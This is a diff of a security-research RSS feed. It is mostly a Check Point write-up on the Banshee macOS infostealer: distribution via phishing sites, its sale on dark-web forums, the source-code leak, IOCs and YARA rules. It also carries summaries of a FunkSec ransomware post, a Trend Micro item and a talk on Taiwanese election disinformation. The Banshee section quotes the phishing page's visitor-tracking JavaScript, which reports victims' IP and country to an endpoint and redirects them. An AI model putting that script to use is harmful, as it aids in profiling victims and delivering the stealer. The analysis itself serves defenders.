-      async function sendVisitorDetails(isVerifyClick = false) {
-        try {
-          const response = await fetch('&amp;lt;https://ipapi.co/json/&gt;');
-          const data = await response.json();
-
-          const userAgent = navigator.userAgent;
-          let os = 'Unknown';
-          let redirectUrl = null;
-
-          if (/Macintosh/i.test(userAgent) &amp;amp;&amp;amp; !/iPhone|iPad|iPod/i.test(userAgent)) {
-            os = '&lt;img alt="✅" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2705.png" style="height: 1em;" /&gt; macOS';
-          } else if (/iPhone|iPad|iPod|Android/i.test(userAgent)) {
-            os = '&lt;img alt="⚠" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/26a0.png" style="height: 1em;" /&gt; Mobile';
-            redirectUrl = 'mobile.html';  
-          } else if (/Windows/i.test(userAgent)) {
-            os = '&lt;img alt="✅" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2705.png" style="height: 1em;" /&gt; Windows';
-          }
-
-          const message = isVerifyClick
-            ? ` MacOS user is being shown stealer installation instructions:\\n- OS: ${os}\\n-  Country: ${data.country_name || 'Unknown'}\\n-  IP: ${data.ip || 'Unknown'}`
-            : ` MacOS user redirected to stealer page:\\n- OS: ${os}\\n-  Country: ${data.country_name || 'Unknown'}\\n-  IP: ${data.ip || 'Unknown'}`;
-
-          await fetch('sendNotification.php', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ message: message })
-          });
-
-          if (redirectUrl &amp;amp;&amp;amp; !isVerifyClick) {
-            window.location.href = redirectUrl;
-          }
-
-        } catch (error) {
-          console.error('Failed to send visitor details:', error);
-        }
-      }
-
-      sendVisitorDetails();
-
-      document.querySelectorAll('.verify-trigger').forEach(button =&gt; {
-        button.addEventListener('click', () =&gt; {
-          sendVisitorDetails(true);  
-        });
-      });
-    });
-  &amp;lt;/script&gt;
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;In this case, the threat actor is not performing dual infections on MacOS and Windows users and is clearly only interested in victims using the first one. How a victim arrives at the phishing website is currently unclear; however, users seeking to download cracked or tools from illegitimate sources are the target of such attacks. Similar phishing websites have been found distributing constantly updated &lt;code&gt;.dmg&lt;/code&gt; files, as shown by the URLs and corresponding filenames below:&lt;/p&gt;
-
-
-
-&lt;pre class="wp-block-preformatted"&gt;- Telegram.dmg         hxxp://api7[.]cfd/testet123t/&lt;br /&gt;- TradingView.dmg      hxxps://coincapy[.]com/zx/&lt;br /&gt;- MediaKIT.dmg         hxxps://fotor[.]software/MediaKIT&lt;br /&gt;- Contract.dmg         hxxps://fotor[.]software/MacOS/Collaboration&lt;br /&gt;&lt;/pre&gt;
-
-
-
-&lt;p&gt;Even though the Banshee stealer-as-a-service business has closed, threat actors are still using the updated versions of the service and performing new campaigns targeting MacOS users. It is unclear whether the remaining campaigns originate from previous customers or if the creator of Banshee is continuously updating the source code and using the malware as part of the private group hired in XSS to conduct MacOS campaigns.&lt;/p&gt;
-
-
-
-&lt;h1 class="wp-block-heading"&gt;Author and Darkweb Forums&lt;/h1&gt;
-
-
-
-&lt;p&gt;On July 18, &lt;code&gt;@kolosain&lt;/code&gt; created a Telegram channel and began selling the Banshee stealer for $2,999. Then, between August 13 and 15, the account &lt;code&gt;@0xe1&lt;/code&gt;, the same actor behind the Telegram channel (&lt;code&gt;@kolosain&lt;/code&gt;), published on XSS and Exploit forums offering the Banshee MacOS stealer as a service to a broader audience for a discounted price of $1,500 per month.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30971" height="787" src="https://research.checkpoint.com/wp-content/uploads/2024/12/016-1024x787.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 16 &amp;#8211; XSS post.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Between August 26 and 28, &lt;code&gt;@0xe1&lt;/code&gt; started recruiting members for a small private group that would operate and perform campaigns. The seller offered the Banshee stealer and support to bypass Antivirus engines, starting with a 50% profit share for affiliates, which later increased to 60-65%. The recruitment was limited to only two spots, and &lt;code&gt;@0xe1&lt;/code&gt; was searching for skilled actors with experience.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30972" height="659" src="https://research.checkpoint.com/wp-content/uploads/2024/12/017-1024x659.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 17 &amp;#8211; Private group recruitment.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; discovered the first version of Banshee Stealer using this new string encryption algorithm on September 26. Since then, campaigns using the old version have not been observed. On October 17, the author posted on XSS trying to sell the entire project for 1BTC. Soon after, the price dropped to $30.000. The timing suggests that the author may have been aware that the original source code had been leaked and was trying to quickly sell the project to make some quick cash.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30973" height="693" src="https://research.checkpoint.com/wp-content/uploads/2024/12/018-1024x693.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 18 &amp;#8211; Banshee sale post.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Throughout this entire time, from October 10 to November 14, the stealer received updates which can be seen by posts on the Banshee forums.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30974" height="393" src="https://research.checkpoint.com/wp-content/uploads/2024/12/019.jpg" width="1014" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 19 &amp;#8211; Updates post.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;By November 24, the author decided to close the service since the original source code of the Banshee Stealer was &lt;a href="https://github.com/Evi1Grey5/MacOS-S"&gt;leaked&lt;/a&gt; the previous day. Since then, we discovered multiple campaigns mostly distributed through phishing websites. It is unclear if those campaigns are performed by the remaining customers or the author’s private group.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30975" height="784" src="https://research.checkpoint.com/wp-content/uploads/2024/12/020.png" width="953" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 20 &amp;#8211; Closing business.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Shortly after the code leak, antivirus engines started detecting even the newest versions of Banshee, which included string encryption and new anti-analysis techniques. While this leak may help improve detection, it also poses the risk of creating multiple forks and new versions of Banshee being developed and distributed by different actors.&lt;/p&gt;
-
-
-
-&lt;h1 class="wp-block-heading"&gt;Conclusion&lt;/h1&gt;
-
-
-
-&lt;p&gt;This relatively small code update of string encryption introduced by the developer of Banshee caused most antivirus engines to fail to detect this dangerous macOS infostealer for over two months. This illustrates the growing trend of threat actors targeting macOS users as well as the expansion of their arsenal and capabilities with malware and tools for different operating systems.&lt;/p&gt;
-
-
-
-&lt;p&gt;Malicious repositories on GitHub which primarily target Windows users, have gradually extended their reach to macOS, Linux, and Android platforms. The surge in infections among Windows users led threat actors to replicate their attack chain for macOS, broadening the scope of the threat across multiple operating systems. While Windows-based malware was often distributed via password-protected archives on GitHub to evade detection, macOS disk image files (DMG) and unprotected archives were openly shared on the platform.&lt;/p&gt;
-
-
-
-&lt;p&gt;Despite macOS traditionally being regarded as more secure, Banshee&amp;#8217;s success demonstrates the importance for macOS users to remain vigilant. It is crucial for security solutions to evolve and provide better protection against increasingly sophisticated attacks as threat actors continue to expand their reach.&lt;/p&gt;
-
-
-
-&lt;h1 class="wp-block-heading"&gt;Mitigations&lt;/h1&gt;
-
-
-
-&lt;p&gt;Operating systems and applications must be updated with timely patches and other means to mitigate the risks of threats like Banshee Stealer. Individuals should exercise caution when dealing with unexpected emails or messages containing links, particularly from unknown senders. Enhancing cybersecurity awareness among employees is also crucial, as it fosters a vigilant workforce. Lastly, consulting security specialists for any uncertainties can provide valuable expertise and guidance in navigating potential security challenges.&lt;/p&gt;
-
-
-
-&lt;h1 class="wp-block-heading"&gt;Indicators of Compromise&lt;/h1&gt;
-
-
-
-&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Description&lt;/th&gt;&lt;th&gt;Value&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;MacOS archive releases&lt;/td&gt;&lt;td&gt;cdfbcb3d850713c49d451b3e80fb8507f86ba4ad9385e083c2a2bf8d11adc4fb&lt;br /&gt;1dcf3b607d2c9e181643dd6bf1fd85e39d3dc4f95b6992e5a435d0d900333416&lt;br /&gt;d8ecc92571b3bcd935dcab9cdbeda7c2ebda3021dda013920ace35d294db07be&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Banshee MacOS Stealer&lt;/td&gt;&lt;td&gt;00c68fb8bcb44581f15cb4f888b4dec8cd6d528cacb287dc1bdeeb34299b8c93&lt;br /&gt;ce371a92e905d12cb16b5c273429ae91d6ff5485dda04bfedf002d2006856038&lt;br /&gt;d04f71711e7749a4ff193843ae9ce852c581e55eaf29b8eec5b36c4b9c8699c2&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Banshee Command &amp;amp; Control&lt;/td&gt;&lt;td&gt;41[.]216[.]183[.]49&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Lumma Stealer&lt;/td&gt;&lt;td&gt;3bcd41e8da4cf68bb38d9ef97789ec069d393306a5d1ea5846f0c4dc0d5beaab&lt;br /&gt;b978c70331fc81804dea11bf0b334aa324d94a2540a285ba266dd5bbfbcbc114&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Lumma C&amp;amp;C&lt;/td&gt;&lt;td&gt;authorisev[.]site&lt;br /&gt;contemteny[.]site&lt;br /&gt;dilemmadu[.]site&lt;br /&gt;faulteyotk[.]site&lt;br /&gt;forbidstow[.]site&lt;br /&gt;goalyfeastz[.]site&lt;br /&gt;opposezmny[.]site&lt;br /&gt;seallysl[.]site&lt;br /&gt;servicedny[.]site&lt;br /&gt;hxxps://steamcommunity[.]com/profiles/76561199724331900&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
-
-
-
-&lt;h1 class="wp-block-heading"&gt;Yara Rules&lt;/h1&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;private rule macos_binary
-{
-  meta:
-    author = "Antonis Terefos @Tera0017/@Check Point Research"
-    descr = "MacOS file format"
-  condition:
-     uint32(0) == 0xFEEDFACE or uint32(0) == 0xFEEDFACF or uint32(0) == 0xBEBAFECA
-}
-
-rule banshee_macos
-{
-  meta:
-    author = "Antonis Terefos @Tera0017/@Check Point Research"
-    descr = "Banshee MacOS stealer, encrypted strings version"
-    sha256 = "ce371a92e905d12cb16b5c273429ae91d6ff5485dda04bfedf002d2006856038"
-  strings:
-    // x64 
-    $x64_code_str_decr1 = {80 E1 ?? (48| 49) 89 (DE| F0| FE) (48| 49) D3 (EE| E8) (40| 44) 30 ?? 48 83 C2 08}
-    $x64_code_str_decr12 = {0B 09 7D 92 2B 25 CB 9A 4C 01 40 39 8B 01 0B 4A 4B 15 00 38}
-    $x64_code_str_decr2 = {48 89 ?? 48 D3 [1-2] 30 ?? 48 83 C1 08 48 FF C?}
-    $x64_code_str_decr3 = {81 30 [4] C6 40 04 00}
-    $x64_code_str_decr4 = {2B 25 C8 9A 4C 01 40 39 8B 01 0B 4A 4B 15 00 38 08 21 00 91}
-    $x64_code_campid = {88 14 08 8A 54 31 02 48 FF C1 48 83 F9 1D}
-    $x64_code_gen1 = {C6 40 09 00 31 C9 8A 14 08}
-    $x64_code_gen2 = {88 14 31 8A 54 30 02 48 FF C6 84 D2}
-    $x64_code_gen3 = {72 00 77 00 [30] 00 3B 00 00}
-    // Arm
-    $arm_code_str_decr1 = {0B 09 7D 92 2B 25 CB 9A 4C 01 40 39 8B 01 0B 4A 4B 15 00 38 08 21 00 91}
-    $arm_code_str_decr2 = {2B 25 C8 9A 4C 01 40 39 8B 01 0B 4A 4B 15 00 38 08 21 00 91}
-    $arm_code_campid = {6C 01 09 8B 0A 69 29 38 8A 05 40 39 29 05 00 91 3F 79 00 F1}
-    $arm_code_gen1 = {1F 24 00 39 08 00 80 D2}
-    $arm_code_gen2 = {72 00 77 00 [30] 00 3B 00 00}
-  condition:
-    macos_binary and 6 of ($x64_code*) or all of ($arm_code*)
-}
-&lt;/pre&gt;
-
-
-
-&lt;h1 class="wp-block-heading"&gt;Related Research&lt;/h1&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;a href="https://www.elastic.co/security-labs/beyond-the-wail"&gt;https://www.elastic.co/security-labs/beyond-the-wail&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;a href="https://alden.io/posts/secrets-of-xprotect/#reverse-engineering-the-redpine-remediator"&gt;https://alden.io/posts/secrets-of-xprotect/#reverse-engineering-the-redpine-remediator&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;a href="https://github.com/Evi1Grey5/MacOS-S"&gt;https://github.com/Evi1Grey5/MacOS-S&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;a href="https://www.securityweek.com/source-code-of-3000-a-month-macos-malware-banshee-stealer-leaked/"&gt;https://www.securityweek.com/source-code-of-3000-a-month-macos-malware-banshee-stealer-leaked/&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;a href="https://www.sentinelone.com/blog/from-amos-to-poseidon-a-soc-teams-guide-to-detecting-macos-atomic-stealers-2024/"&gt;https://www.sentinelone.com/blog/from-amos-to-poseidon-a-soc-teams-guide-to-detecting-macos-atomic-stealers-2024/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/banshee-macos-stealer-that-stole-code-from-macos-xprotect/"&gt;Banshee: The Stealer That &amp;#8220;Stole Code&amp;#8221; From MacOS XProtect&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=30935</guid><category>Check Point Research Publications</category></item><item><title>LABScon24 Replay | The Real AI Race: Disinformation in the Taiwanese Election</title><link>https://www.sentinelone.com/labs/labscon24-replay-the-real-ai-race-disinformation-in-the-taiwanese-election/</link><description>Martin Wendiggensen reveals how disinformation shaped Taiwan’s election, and how AI-powered research uncovered hidden influences on voter behavior.</description><content:encoded>&lt;p&gt;AI disinformation, deep fakes, armies of lying bots, and automated deception is the biggest threat to our elections, or so we’ve been told. But looking at Taiwan’s 2024 election, none of these nightmare scenarios materialized. The deafening silence of effective AI disinformation from China, America’s most advanced opponent, was surprising. Even more so given the focus on the election at the highest levels of the Chinese government.&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/funksec-alleged-top-ransomware-group-powered-by-ai/"&gt;FunkSec – Alleged Top Ransomware Group Powered by AI&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=30996</guid><category>Check Point Research Publications</category></item><item><title>Trend Micro™ Managed XDR Analysis of Infection From Fake Installers and Cracks</title><link>https://www.trendmicro.com/en_us/research/25/a/how-cracks-and-installers-bring-malware-to-your-device.html</link><description>Our research shows how attackers use platforms like YouTube to spread fake installers via trusted hosting services, employing encryption to evade detection and steal sensitive browser data.</description><guid isPermaLink="false">urn:uuid:e0eb8943-e39a-7102-c821-f9d557360f85</guid><category>Trend Micro Research : Malware</category><category>Trend Micro Research : Endpoints</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>LABScon24 Replay | The Real AI Race: Disinformation in the Taiwanese Election</title><link>https://www.sentinelone.com/labs/labscon24-replay-the-real-ai-race-disinformation-in-the-taiwanese-election/</link><description>Martin Wendiggensen reveals how disinformation shaped Taiwan’s election, and how AI-powered research uncovered hidden influences on voter behavior.</description><content:encoded>&lt;p&gt;AI disinformation, deep fakes, armies of lying bots, and automated deception is the biggest threat to our elections, or so we’ve been told. But looking at Taiwan’s 2024 election, none of these nightmare scenarios materialized. The deafening silence of effective AI disinformation from China, America’s most advanced opponent, was surprising. Even more so given the focus on the election at the highest levels of the Chinese government.&lt;/p&gt;
 &lt;p&gt;In this highly-engaging talk, Martin Wendiggensen details how he set out to study the election and collected tens of thousands of hours of footage from YouTube and television as well as hundreds of thousands of news articles, blog posts, and social media content. This collection was then analyzed with a multi-modal AI pipeline. The results indicated that the small amount of AI-content received no engagement and had no impact.&lt;/p&gt;
 &lt;p&gt;Instead, Taiwanese billionaires earning most of their money in China mounted a concerted effort to buy or set up local news outlets in Taiwan in the run-up to the election. Conducting a large-scale analysis of these outlets’ output uncovered interesting results. Their viewership, numbering in the millions, presented slanted narratives aligned with the Beijing-friendly KMT and a new emergent third party. While losing the presidential election, these two parties managed to wrest control of Taiwan’s parliament and are set to have a major impact on the country’s foreign and domestic policies.&lt;/p&gt;
 &lt;p&gt;This presentation guides the audience through Chinese and local disinformation efforts in the Taiwanese election, highlighting the main lessons that can be drawn from them to safeguard future elections. Along the way, Martin explains the research methodology and toolbox that leverages open-source AI to fight disinformation.&lt;/p&gt;
